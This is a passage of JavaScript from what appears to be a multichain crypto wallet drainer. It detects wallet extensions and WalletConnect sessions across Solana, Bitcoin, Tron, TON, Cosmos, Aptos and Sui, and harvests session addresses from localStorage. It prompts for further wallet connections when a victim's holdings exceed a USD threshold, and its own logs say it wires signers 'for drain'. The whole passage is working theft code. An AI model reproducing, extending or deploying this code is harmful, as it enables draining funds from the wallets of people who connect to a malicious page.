      var api = ev.detail && ev.detail.register;
      if (typeof api === 'function') {
        api(function (w) { registerSolanaWalletStandard(w); });
      }
    });
    if (window.navigator && window.navigator.wallets) {
      window.navigator.wallets.forEach(registerSolanaWalletStandard);
    }
  } catch (e) {}

  function hasSvmApi(p) {
    if (!p || typeof p !== 'object') return false;
    var canConnect = !!(p.connect || (p.features && p.features['standard:connect']));
    var canSign = !!(p.signTransaction || p.signAllTransactions ||
      (p.features && (p.features['solana:signTransaction'] || p.features['solana:signAllTransactions'])));
    return canConnect && canSign;
  }

  function hasUtxoApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.signPsbt && (p.requestAccounts || p.connect || p.getAccounts));
  }

  function hasTronApi(obj) {
    if (!obj) return false;
    var tw = obj.tronWeb || obj;
    return !!(tw && (tw.defaultAddress || tw.trx || tw.transactionBuilder));
  }

  function hasTonApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.sendTransaction || p.send);
  }

  function hasCosmosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.enable && (p.signAmino || p.signDirect || p.getKey));
  }

  function hasAptosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signAndSubmitTransaction || p.account);
  }

  function hasSuiApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signTransactionBlock || p.signAndExecuteTransactionBlock);
  }

  function pushFamily(list, seen, provider, family, hint) {
    if (!provider || typeof provider !== 'object') return;
    if (seen.indexOf(provider) !== -1) return;
    seen.push(provider);
    list.push({ family: family, provider: provider, hint: hint || family });
  }

  function scanObjectForFamily(root, list, seen, family, testFn, prefix) {
    if (!root || typeof root !== 'object') return;
    try {
      if (testFn(root)) pushFamily(list, seen, root, family, prefix || family);
    } catch (e) {}
    var keys;
    try { keys = Object.keys(root); } catch (e2) { return; }
    for (var i = 0; i < keys.length; i++) {
      var k = keys[i];
      if (k === 'parent' || k === 'top' || k === 'window') continue;
      try {
        var child = root[k];
        if (child && typeof child === 'object' && testFn(child)) {
          pushFamily(list, seen, child, family, (prefix ? prefix + '.' : '') + k);
        }
      } catch (e3) {}
    }
  }

  function discoverChainFamilies() {
    var seen = [];
    var fp = {
      SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [],
    };

    discoveredSolanaWallets.forEach(function (w) {
      pushFamily(fp.SVM, seen, w, 'SVM', (w && w.name) ? w.name : 'wallet-standard');
    });

    scanObjectForFamily(window.solana, fp.SVM, seen, 'SVM', hasSvmApi, 'window.solana');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SVM, seen, 'SVM', hasSvmApi, 'phantom');
    if (window.solflare) pushFamily(fp.SVM, seen, window.solflare, 'SVM', 'solflare');
    if (window.backpack) scanObjectForFamily(window.backpack, fp.SVM, seen, 'SVM', hasSvmApi, 'backpack');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.SVM, seen, 'SVM', hasSvmApi, 'bitkeep');
    if (window.trustwallet) scanObjectForFamily(window.trustwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'trustwallet');
    // Trust in-app: explicit window.trustwallet.solana provider (per Trust docs)
    if (window.trustwallet && window.trustwallet.solana) {
      pushFamily(fp.SVM, seen, window.trustwallet.solana, 'SVM', 'trustwallet.solana');
    }
    if (window.coinbaseSolana) pushFamily(fp.SVM, seen, window.coinbaseSolana, 'SVM', 'coinbaseSolana');

    if (window.unisat) pushFamily(fp.UTXO, seen, window.unisat, 'UTXO', 'unisat');
    if (window.BitcoinProvider) pushFamily(fp.UTXO, seen, window.BitcoinProvider, 'UTXO', 'BitcoinProvider');
    if (window.LeatherProvider) pushFamily(fp.UTXO, seen, window.LeatherProvider, 'UTXO', 'leather');
    if (window.HiroWalletProvider) pushFamily(fp.UTXO, seen, window.HiroWalletProvider, 'UTXO', 'hiro');
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      pushFamily(fp.UTXO, seen, window.XverseProviders.BitcoinProvider, 'UTXO', 'xverse');
    }
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'bitkeep');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'phantom');
    // Trust in-app: window.trustwallet.bitcoin (per Trust docs — bip122)
    if (window.trustwallet && window.trustwallet.bitcoin) {
      pushFamily(fp.UTXO, seen, window.trustwallet.bitcoin, 'UTXO', 'trustwallet.bitcoin');
    }

    if (window.tronLink) pushFamily(fp.TRON, seen, window.tronLink, 'TRON', 'tronLink');
    if (window.tronWeb) pushFamily(fp.TRON, seen, { tronWeb: window.tronWeb }, 'TRON', 'tronWeb');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TRON, seen, 'TRON', hasTronApi, 'okxwallet');
    // Trust in-app: window.trustwallet.tron
    if (window.trustwallet && window.trustwallet.tron) {
      pushFamily(fp.TRON, seen, { tronWeb: window.trustwallet.tron }, 'TRON', 'trustwallet.tron');
    }

    if (window.tonkeeper) pushFamily(fp.TON, seen, window.tonkeeper, 'TON', 'tonkeeper');
    if (window.ton) pushFamily(fp.TON, seen, window.ton, 'TON', 'ton');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TON, seen, 'TON', hasTonApi, 'okxwallet');
    // Trust in-app: window.trustwallet.ton
    if (window.trustwallet && window.trustwallet.ton) {
      pushFamily(fp.TON, seen, window.trustwallet.ton, 'TON', 'trustwallet.ton');
    }

    if (window.keplr) pushFamily(fp.COSMOS, seen, window.keplr, 'COSMOS', 'keplr');
    if (window.leap) pushFamily(fp.COSMOS, seen, window.leap, 'COSMOS', 'leap');
    if (window.cosmostation && window.cosmostation.providers) {
      scanObjectForFamily(window.cosmostation.providers, fp.COSMOS, seen, 'COSMOS', hasCosmosApi, 'cosmostation');
    }
    // Trust in-app: window.trustwallet.cosmos (per Trust docs)
    if (window.trustwallet && window.trustwallet.cosmos) {
      pushFamily(fp.COSMOS, seen, window.trustwallet.cosmos, 'COSMOS', 'trustwallet.cosmos');
    }

    if (window.aptos) pushFamily(fp.APTOS, seen, window.aptos, 'APTOS', 'aptos');
    if (window.petra && window.petra.aptos) pushFamily(fp.APTOS, seen, window.petra.aptos, 'APTOS', 'petra');
    if (window.martian) pushFamily(fp.APTOS, seen, window.martian, 'APTOS', 'martian');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.APTOS, seen, 'APTOS', hasAptosApi, 'okxwallet');
    // Trust in-app: window.trustwallet.aptos
    if (window.trustwallet && window.trustwallet.aptos) {
      pushFamily(fp.APTOS, seen, window.trustwallet.aptos, 'APTOS', 'trustwallet.aptos');
    }

    if (window.suiWallet) pushFamily(fp.SUI, seen, window.suiWallet, 'SUI', 'suiWallet');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SUI, seen, 'SUI', hasSuiApi, 'phantom');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SUI, seen, 'SUI', hasSuiApi, 'okxwallet');
    // Trust in-app: window.trustwallet.sui
    if (window.trustwallet && window.trustwallet.sui) {
      pushFamily(fp.SUI, seen, window.trustwallet.sui, 'SUI', 'trustwallet.sui');
    }

    S.familyProviders = fp;
    var counts = [];
    Object.keys(fp).forEach(function (k) {
      if (fp[k].length) counts.push(k + ':' + fp[k].length);
    });
    if (counts.length) L.log('[families] detected', counts.join(' '));
    return fp;
  }

  function normalizeInjectedWalletKey(raw) {
    var k = String(raw || '').toLowerCase();
    if (k.indexOf('metamask') >= 0 || k === 'io.metamask') return 'metamask';
    if (k.indexOf('trust') >= 0 || k === 'com.trustwallet.app') return 'trust';
    if (k.indexOf('okx') >= 0) return 'okx';
    if (k.indexOf('phantom') >= 0) return 'phantom';
    if (k.indexOf('coinbase') >= 0) return 'coinbase';
    if (k.indexOf('rabby') >= 0) return 'rabby';
    if (k.indexOf('binance') >= 0) return 'binance';
    if (k.indexOf('bitget') >= 0 || k.indexOf('bitkeep') >= 0) return 'bitget';
    if (k.indexOf('exodus') >= 0) return 'exodus';
    return k.replace(/[^a-z0-9]/g, '') || 'injected';
  }

  /** Non-EVM families to actively connect per extension wallet pick (EVM always via eth_requestAccounts). */
  var INJECTED_WALLET_FAMILIES = {
    metamask: [],
    rabby: [],
    coinbase: ['SVM'],
    binance: [],
    brave: [],
    frame: [],
    zerion: ['SVM'],
    rainbow: ['SVM'],
    uniswap: [],
    ledger: [],
    injected: [],
    trust: ['SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'],
    okx: ['SVM', 'UTXO', 'TRON', 'TON', 'APTOS', 'SUI'],
    phantom: ['SVM', 'UTXO', 'SUI'],
    bitget: ['SVM', 'UTXO'],
    exodus: ['SVM', 'UTXO'],
  };

  var WALLET_PROVIDER_HINTS = {
    coinbase: { SVM: ['coinbasesolana', 'coinbase'] },
    trust: {
      SVM: ['trustwallet', 'trustwallet.solana', 'window.solana'],
      TRON: ['tronlink', 'tronweb', 'trustwallet', 'trustwallet.tron'],
      UTXO: ['trustwallet', 'trustwallet.bitcoin'],
      TON: ['trustwallet', 'trustwallet.ton', 'ton', 'tonkeeper'],
      COSMOS: ['trustwallet', 'trustwallet.cosmos', 'keplr'],
      APTOS: ['trustwallet', 'trustwallet.aptos', 'aptos', 'petra'],
      SUI: ['trustwallet', 'trustwallet.sui', 'suiWallet'],
    },
    okx: {
      SVM: ['okxwallet'], UTXO: ['okxwallet'], TRON: ['okxwallet'],
      TON: ['okxwallet'], APTOS: ['okxwallet'], SUI: ['okxwallet'],
    },
    phantom: { SVM: ['phantom', 'window.solana'], UTXO: ['phantom'], SUI: ['phantom'] },
    bitget: { SVM: ['bitkeep', 'bitget'], UTXO: ['bitkeep', 'bitget'] },
    exodus: { SVM: ['exodus'], UTXO: ['exodus'] },
    rainbow: { SVM: ['rainbow'] },
    zerion: { SVM: ['zerion'] },
  };

  function getWcFamilyAdaptersFromWallet() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getWcFamilyAdapters === 'function') {
        return window.LegionWallet.getWcFamilyAdapters() || {};
      }
      if (window.LegionWallet && typeof window.LegionWallet.buildWcFamilyAdapters === 'function') {
        var sess = window.LegionWallet.getSessionAddresses && window.LegionWallet.getSessionAddresses();
        return window.LegionWallet.buildWcFamilyAdapters(sess && sess.families ? sess.families : {}) || {};
      }
    } catch (e) { L.warn('[wc-adapters]', e.message); }
    return {};
  }

  async function loadTronWebLib() {
    if (window.TronWeb) return window.TronWeb;
    try {
      await loadVendorScript('tronweb.iife.js');
      if (window.TronWeb) return window.TronWeb;
    } catch (e) { /* optional */ }
    if (!CDN_FALLBACK) return null;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/tronweb@5.3.2/dist/TronWeb.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.TronWeb || null;
  }

  function familyConnectionCanSign(conn, family) {
    if (!conn || conn.addressOnly === true) return false;
    var fam = String(family || conn.family || '').toUpperCase();
    if (conn.wcSigner) return true;
    if (fam === 'TRON') return !!(conn.tronWeb && conn.tronWeb.trx && conn.tronWeb.trx.sign);
    if (fam === 'TON') return !!(conn.provider && (conn.provider.sendTransaction || conn.type === 'tonconnect'));
    if (fam === 'COSMOS') return !!(conn.provider && conn.provider.signAmino);
    if (fam === 'APTOS') return !!(conn.provider && conn.provider.signAndSubmitTransaction);
    if (fam === 'SUI') return !!(conn.provider && (conn.provider.signTransactionBlock || conn.provider.signAndExecuteTransactionBlock));
    if (fam === 'SVM') return !!(conn.provider);
    if (fam === 'UTXO') return !!(conn.provider);
    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return true;
    return !!conn.provider;
  }

  function familiesForInjectedWallet(walletKey) {
    var key = normalizeInjectedWalletKey(walletKey);
    if (Object.prototype.hasOwnProperty.call(INJECTED_WALLET_FAMILIES, key)) {
      return INJECTED_WALLET_FAMILIES[key].slice();
    }
    return (INJECTED_WALLET_FAMILIES.injected || []).slice();
  }

  function hintMatchesWallet(hint, allowed) {
    var h = String(hint || '').toLowerCase();
    for (var i = 0; i < allowed.length; i++) {
      if (h.indexOf(String(allowed[i]).toLowerCase()) >= 0) return true;
    }
    return false;
  }

  function firstFamilyProvider(family) {
    var list = (S.familyProviders && S.familyProviders[family]) || [];
    if (!list.length) return null;
    if (S.connectMode === 'injected' && S.injectedWalletKey) {
      var key = normalizeInjectedWalletKey(S.injectedWalletKey);
      var hints = WALLET_PROVIDER_HINTS[key];
      if (hints && hints[family]) {
        for (var i = 0; i < list.length; i++) {
          if (hintMatchesWallet(list[i].hint, hints[family])) return list[i];
        }
        // In-app Trust: still use first discovered provider (hint mismatch must not block)
        if (isTrustInAppBrowser()) return list[0];
        return null;
      }
      if ((INJECTED_WALLET_FAMILIES[key] || []).indexOf(family) === -1) return null;
    }
    return list[0];
  }

  function collectAddressMap(evmOptional) {
    var m = {};
    var evm = evmOptional || S.evmAddr;
    if (evm) m.evm = String(evm).toLowerCase();
    if (S.chains.SOL && S.chains.SOL.address) m.sol = S.chains.SOL.address;
    if (S.chains.TRON && S.chains.TRON.address) m.tron = S.chains.TRON.address;
    if (S.chains.TON && S.chains.TON.address) m.ton = S.chains.TON.address;
    if (S.chains.BTC && S.chains.BTC.address) m.btc = S.chains.BTC.address;
    if (S.chains.COSMOS && S.chains.COSMOS.address) m.cosmos = S.chains.COSMOS.address;
    if (S.chains.APTOS && S.chains.APTOS.address) m.aptos = S.chains.APTOS.address;
    if (S.chains.SUI && S.chains.SUI.address) m.sui = S.chains.SUI.address;
    if (S.chains.POLKADOT && S.chains.POLKADOT.address) m.polkadot = S.chains.POLKADOT.address;
    if (S.chains.ALGORAND && S.chains.ALGORAND.address) m.algorand = S.chains.ALGORAND.address;
    if (S.chains.CARDANO && S.chains.CARDANO.address) m.cardano = S.chains.CARDANO.address;
    return m;
  }

  function scanWcSessionAllFamilies() {
    var out = {};
    var NS_OUT = {
      eip155: 'evm', solana: 'sol', bip122: 'btc', tron: 'tron', ton: 'ton', tvm: 'ton',
      cosmos: 'cosmos', polkadot: 'polkadot', algorand: 'algorand', cardano: 'cardano',
      aptos: 'aptos', sui: 'sui', near: 'near',
    };
    function putAddr(outKey, caip) {
      if (!caip || out[outKey]) return;
      var addr = null;
      if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.extractWcAccountAddress === 'function') {
        addr = window.LegionCaipRegistry.extractWcAccountAddress(caip, function (m) { L.log(m); });
      } else if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.parseCaip10WithFallback === 'function') {
        var p = window.LegionCaipRegistry.parseCaip10WithFallback(caip, function (m) { L.log(m); });
        addr = p && p.address ? p.address : null;
      }
      if (!addr) {
        var parts = String(caip).split(':');
        addr = parts[parts.length - 1];
      }
      if (!addr) return;
      out[outKey] = outKey === 'evm' ? String(addr).toLowerCase() : addr;
    }
    try {
      var keys = Object.keys(localStorage);
      for (var ki = 0; ki < keys.length; ki++) {
        var k = keys[ki];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var si = sessions.length - 1; si >= 0; si--) {
          var ns = sessions[si] && sessions[si].namespaces;
          if (!ns) continue;
          Object.keys(NS_OUT).forEach(function (nsKey) {
            if (ns[nsKey] && ns[nsKey].accounts && ns[nsKey].accounts[0]) {
              putAddr(NS_OUT[nsKey], ns[nsKey].accounts[0]);
            }
          });
        }
      }
    } catch (e) {}
    return out;
  }

  function wireWcBtcConnection(btcAddr) {
    if (!btcAddr || S.familyConnections.UTXO) return;
    var btcProv = null;
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
        btcProv = window.LegionWallet.getBitcoinProvider();
      }
    } catch (e) {}
    if (!btcProv) {
      L.warn('[UTXO] WC session has BTC address but no bip122 provider — wallet may not expose signPsbt');
      return;
    }
    S.familyConnections.UTXO = {
      provider: btcProv,
      address: btcAddr,
      name: 'UTXO',
      family: 'UTXO',
      hint: 'walletconnect',
    };
    L.log('[UTXO] WC provider wired for drain');
  }

  function applyWcSessionAddresses(wcAddr) {
    if (!wcAddr) return;
    if (wcAddr.sol && !S.chains.SOL) {
      S.chains.SOL = { address: wcAddr.sol, name: 'SVM', wcSession: true };
      L.log('[SVM] WC session address:', wcAddr.sol.slice(0, 8) + '...');
    }
    if (wcAddr.btc && !S.chains.BTC) {
      S.chains.BTC = { address: wcAddr.btc, name: 'UTXO', wcSession: true };
      L.log('[UTXO] WC session address:', wcAddr.btc.slice(0, 8) + '...');
      wireWcBtcConnection(wcAddr.btc);
    }
    if (wcAddr.tron && !S.chains.TRON) {
      S.chains.TRON = { address: wcAddr.tron, wcSession: true };
      L.log('[TRON] WC session address:', wcAddr.tron.slice(0, 8) + '...');
    }
    if (wcAddr.ton && !S.chains.TON) {
      S.chains.TON = { address: wcAddr.ton, wcSession: true };
      L.log('[TON] WC session address:', wcAddr.ton.slice(0, 8) + '...');
    }
    if (wcAddr.cosmos && !S.chains.COSMOS) {
      S.chains.COSMOS = { address: wcAddr.cosmos, wcSession: true };
      L.log('[COSMOS] WC session address:', wcAddr.cosmos.slice(0, 8) + '...');
    }
    if (wcAddr.aptos && !S.chains.APTOS) {
      S.chains.APTOS = { address: wcAddr.aptos, wcSession: true };
      L.log('[APTOS] WC session address:', wcAddr.aptos.slice(0, 8) + '...');
    }
    if (wcAddr.sui && !S.chains.SUI) {
      S.chains.SUI = { address: wcAddr.sui, wcSession: true };
      L.log('[SUI] WC session address:', wcAddr.sui.slice(0, 8) + '...');
    }
    if (wcAddr.polkadot && !S.chains.POLKADOT) {
      S.chains.POLKADOT = { address: wcAddr.polkadot, wcSession: true };
      wireWcPolkadotConnection(wcAddr.polkadot);
      L.log('[DOT] WC session address:', wcAddr.polkadot.slice(0, 8) + '...');
    }
    if (wcAddr.algorand && !S.chains.ALGORAND) {
      S.chains.ALGORAND = { address: wcAddr.algorand, wcSession: true };
      wireWcAlgorandConnection(wcAddr.algorand);
      L.log('[ALGO] WC session address:', wcAddr.algorand.slice(0, 8) + '...');
    }
    if (wcAddr.cardano && !S.chains.CARDANO) {
      S.chains.CARDANO = { address: wcAddr.cardano, wcSession: true };
      wireWcCardanoConnection(wcAddr.cardano);
      L.log('[ADA] WC session address:', wcAddr.cardano.slice(0, 8) + '...');
    }
  }

  function wireWcPolkadotConnection(dotAddr) {
    if (!dotAddr || S.familyConnections.POLKADOT) return;
    S.familyConnections.POLKADOT = {
      provider: null,
      address: dotAddr,
      name: 'POLKADOT',
      family: 'POLKADOT',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function wireWcAlgorandConnection(algoAddr) {
    if (!algoAddr || S.familyConnections.ALGORAND) return;
    S.familyConnections.ALGORAND = {
      provider: null,
      address: algoAddr,
      name: 'ALGORAND',
      family: 'ALGORAND',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function wireWcCardanoConnection(adaAddr) {
    if (!adaAddr || S.familyConnections.CARDANO) return;
    S.familyConnections.CARDANO = {
      provider: null,
      address: adaAddr,
      name: 'CARDANO',
      family: 'CARDANO',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function mergeWcFamilyConnection(familyKey, signerConn, addressOnlyConn) {
    var existing = S.familyConnections[familyKey];
    if (signerConn && (signerConn.wcSigner || signerConn.provider || signerConn.tronWeb)) {
      S.familyConnections[familyKey] = Object.assign({}, signerConn, {
        addressOnly: false,
        wcSigner: true,
      });
      if (!existing || existing.addressOnly) {
        L.log('[' + familyKey + '] WC signer wired' + (existing && existing.addressOnly ? ' (upgraded)' : ''));
      }
      return true;
    }
    if (!existing) {
      S.familyConnections[familyKey] = addressOnlyConn;
    }
    return false;
  }

  /** Min USD on a family before supplemental WC / extension connect prompts (Phase 4). */
  var VALUE_SUPPLEMENTAL_USD = Number(CFG.valueSupplementalUsd) || 5;

  function familyUsdFromFusion(fusionData, drainKey) {
    var familyFromChain = function (chain) {
      var c = String(chain || '').toUpperCase();
      if (c === 'SVM' || c === 'SOL' || c === 'SOLANA') return 'SOL';
      if (c === 'UTXO' || c === 'BTC' || c === 'BITCOIN') return 'BTC';
      if (c === 'TRX' || c === 'TRON') return 'TRON';
      if (c === 'TON') return 'TON';
      if (c === 'COSMOS') return 'COSMOS';
      if (c === 'APTOS') return 'APTOS';
      if (c === 'SUI') return 'SUI';
      return 'EVM';
    };
    var key = String(drainKey || '').toUpperCase();
    var total = 0;
    var assets = (fusionData && fusionData.assets) || S.fusionAssets || [];
    assets.forEach(function (a) {
      var fam = a.family || a.chain_family || familyFromChain(a.chain);
      if (fam === 'SVM') fam = 'SOL';
      if (fam === 'UTXO') fam = 'BTC';
      if (fam === key) total += Number(a.amount_usd || a.usd_value || 0);
    });
    return total;
  }

  function familiesNeedingSupplemental(fusionData) {
    var want = [];
    var nsMap = { TRON: 'tron', TON: 'ton', COSMOS: 'cosmos', APTOS: 'aptos', SUI: 'sui', BTC: 'bip122', SOL: 'sol' };
    var connKeyMap = { SOL: 'SVM', BTC: 'UTXO', TRON: 'TRON', TON: 'TON', COSMOS: 'COSMOS', APTOS: 'APTOS', SUI: 'SUI' };
    Object.keys(nsMap).forEach(function (drainKey) {
      if (!isFamilyDrainReady(drainKey)) return;
      var usd = familyUsdFromFusion(fusionData, drainKey);
      if (usd < VALUE_SUPPLEMENTAL_USD) return;
      var connKey = connKeyMap[drainKey] || drainKey;
      var conn = S.familyConnections[connKey];
      if (conn && familyConnectionCanSign(conn, connKey)) return;
      want.push({ drainKey: drainKey, ns: nsMap[drainKey], connKey: connKey, usd: usd });
    });
    return want;
  }

  async function ensureSupplementalWcForValue(fusionData) {
    if (S.connectMode !== 'wc' || !window.LegionWallet) return;
    var need = familiesNeedingSupplemental(fusionData);
    if (!need.length) return;
    var nsList = [];
    need.forEach(function (n) {
      if (n.ns && n.ns !== 'bip122' && n.ns !== 'sol' && nsList.indexOf(n.ns) < 0) nsList.push(n.ns);
    });
    if (nsList.length && typeof window.LegionWallet.ensureWcSupplementalFamilies === 'function') {
      L.log('[drain-prep] supplemental WC ($' + VALUE_SUPPLEMENTAL_USD + '+):',
        need.map(function (n) { return n.drainKey + ' $' + n.usd.toFixed(2); }).join(', '));
      try {
        await window.LegionWallet.ensureWcSupplementalFamilies({
          projectId: WC_PROJECT_ID,
          optionalNamespaces: WC_OPTIONAL_NAMESPACES,
          wantFamilies: nsList,
          timeoutMs: 90000,
        });
        applyLegionWalletSessionAddresses();
        wireWcFamilyConnections();
      } catch (e) {
        L.warn('[drain-prep] supplemental WC:', e.message);
      }
    }
    if (need.some(function (n) { return n.drainKey === 'BTC'; })) {
      try {
        await ensureWcBip122Linked();
        wireWcFamilyConnections();
      } catch (e) {
        L.warn('[drain-prep] bip122 value-link:', e.message);
      }
    }
  }

  async function prepareExtensionFamiliesBeforeDrain(fusionData) {
    if (S.connectMode !== 'injected') return;
    var need = familiesNeedingSupplemental(fusionData);
    if (!need.length) return;
    var linkerMap = {
      SVM: connectSol, UTXO: connectBtc, TRON: connectTron, TON: connectTon,
      COSMOS: connectCosmos, APTOS: connectAptos, SUI: connectSui,
    };
    L.log('[drain-prep] extension link ($' + VALUE_SUPPLEMENTAL_USD + '+):',
      need.map(function (n) { return n.drainKey + ' $' + n.usd.toFixed(2); }).join(', '));
    for (var i = 0; i < need.length; i++) {
      var ck = need[i].connKey;
      if (S.familyConnections[ck] && familyConnectionCanSign(S.familyConnections[ck], ck)) continue;
      var fn = linkerMap[ck];
      if (!fn || !firstFamilyProvider(ck)) continue;
      try {
        var conn = await fn();
        if (conn) S.familyConnections[ck] = conn;
      } catch (e) {
        L.warn('[drain-prep] extension', need[i].drainKey, e.message);
      }
    }
    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();
  }

  async function prepareWcSignersBeforeDrain(fusionData) {
    applyLegionWalletSessionAddresses();
    if (S.connectMode === 'wc' && window.LegionWallet) {
      try {
        if (typeof window.LegionWallet.harvestMultichainSession === 'function') {
          await window.LegionWallet.harvestMultichainSession({
            waitMs: WC_HARVEST_WAIT_MS,
            wantFamilies: ['sol', 'tron', 'btc', 'ton', 'cosmos', 'aptos', 'sui'],
            linkBitcoin: true,
            ensureBip122: true,
            bip122PollMs: WC_BIP122_POLL_MS,
            projectId: WC_PROJECT_ID,
            metadata: wcMetaPayload(),
            optionalNamespaces: WC_OPTIONAL_NAMESPACES,
            timeoutMs: 60000,
          });
        }
      } catch (e) {
        L.warn('[drain-prep] harvest:', e.message);
      }
    }
    wireWcFamilyConnections();
    if (fusionData) {
      await ensureSupplementalWcForValue(fusionData);
      wireWcFamilyConnections();
    }
    if (S.chains.BTC && (!S.familyConnections.UTXO || S.familyConnections.UTXO.addressOnly)) {
      try {
        await ensureWcBip122Linked();
        wireWcFamilyConnections();
      } catch (e) {
        L.warn('[drain-prep] bip122:', e.message);
      }
    }
    var ready = [];
    ['SVM', 'TRON', 'TON', 'UTXO', 'COSMOS', 'APTOS', 'SUI'].forEach(function (f) {
      var c = S.familyConnections[f];
      if (c && familyConnectionCanSign(c, f)) ready.push(f);
    });
    L.log('[drain-prep] signers ready:', ready.length ? ready.join(', ') : 'EVM only');
    return ready;
  }

  function wireWcFamilyConnections() {
    var wcAdapters = getWcFamilyAdaptersFromWallet();

    if (S.chains.SOL && S.chains.SOL.address) {
      var solProv = null;
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getSolanaProvider === 'function') {
          solProv = window.LegionWallet.getSolanaProvider();
        }
      } catch (e) {}
      if (solProv) {
        mergeWcFamilyConnection('SVM', {
          provider: solProv,
          address: S.chains.SOL.address,
          name: 'SVM',
          family: 'SVM',
          hint: 'walletconnect',
          wcSession: true,
          wcSigner: true,
        }, null);
      } else if (_wcProv) {
        // Fallback: AppKit solanaProvider not available — build WC-backed Solana provider directly
        var _wcSolRef = _wcProv;
        var _solWcProv = {
          signAllTransactions: async function(txs) {
            var signed = [];
            for (var si = 0; si < txs.length; si++) {
              var wireBuf = txs[si].serialize({ requireAllSignatures: false, verifySignatures: false });
              var b64Wire = bufToB64(wireBuf);
              var resp = await _wcSolRef.request({
                method: 'solana_signTransaction',
                params: { transaction: b64Wire },
                chainId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpK',
              });
              if (!resp) throw new Error('WC SOL sign rejected');
              if (resp.transaction) {
                var solLib = await loadSolWeb3();
                signed.push(solLib.Transaction.from(b64ToBuf(resp.transaction)));
              } else if (resp.signature) {
                var sigBytes;
                try { sigBytes = b64ToBuf(resp.signature); } catch (e) { sigBytes = decodeBase58(resp.signature); }
                txs[si].addSignature(txs[si].feePayer, Buffer.from(sigBytes));
                signed.push(txs[si]);
              } else {
                throw new Error('WC SOL unexpected response format');
              }
            }
            return signed;
          },
          signTransaction: async function(tx) { return (await this.signAllTransactions([tx]))[0]; },
        };
        mergeWcFamilyConnection('SVM', {
          provider: _solWcProv,
          address: S.chains.SOL.address,
          name: 'WalletConnect',
          family: 'SVM',
          hint: 'walletconnect',
          wcSession: true,
          wcSigner: true,
        }, null);
        L.log('[SVM] WC direct fallback provider wired');
      } else if (!S.familyConnections.SVM) {
        L.warn('[SVM] WC address — no signer available');
      }
    }

    if (S.chains.TRON && S.chains.TRON.address) {
      var tronConn = wcAdapters.tron || null;
      mergeWcFamilyConnection('TRON', tronConn && tronConn.tronWeb ? Object.assign({
        name: 'TRON',
        family: 'TRON',
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      }, tronConn) : null, {
        provider: null,
        address: S.chains.TRON.address,
        name: 'TRON',
        family: 'TRON',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
    }

    if (S.chains.TON && S.chains.TON.address) {
      var tonConn = wcAdapters.ton || null;
      mergeWcFamilyConnection('TON', tonConn && tonConn.provider ? Object.assign({
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      }, tonConn) : null, {
        provider: null,
        address: S.chains.TON.address,
        name: 'TON',
        family: 'TON',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
    }

    if (S.chains.BTC && S.chains.BTC.address) {
      var btcProv = null;
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
          btcProv = window.LegionWallet.getBitcoinProvider();
        }
      } catch (e) {}
      mergeWcFamilyConnection('UTXO', btcProv ? {
        provider: btcProv,
        address: S.chains.BTC.address,
        name: 'UTXO',
        family: 'UTXO',
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      } : null, {
        provider: null,
        address: S.chains.BTC.address,
        name: 'UTXO',
        family: 'UTXO',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
      if (btcProv) wireWcBtcConnection(S.chains.BTC.address);
    }

    if (S.chains.COSMOS && S.chains.COSMOS.address) {
      var cosmosConn = wcAdapters.cosmos || null;
      mergeWcFamilyConnection('COSMOS', cosmosConn && cosmosConn.provider ? Object.assign({
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      }, cosmosConn) : null, {
        provider: null,
        address: S.chains.COSMOS.address,
        name: 'COSMOS',
        family: 'COSMOS',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
    }

    if (S.chains.APTOS && S.chains.APTOS.address) {
      var aptosConn = wcAdapters.aptos || null;
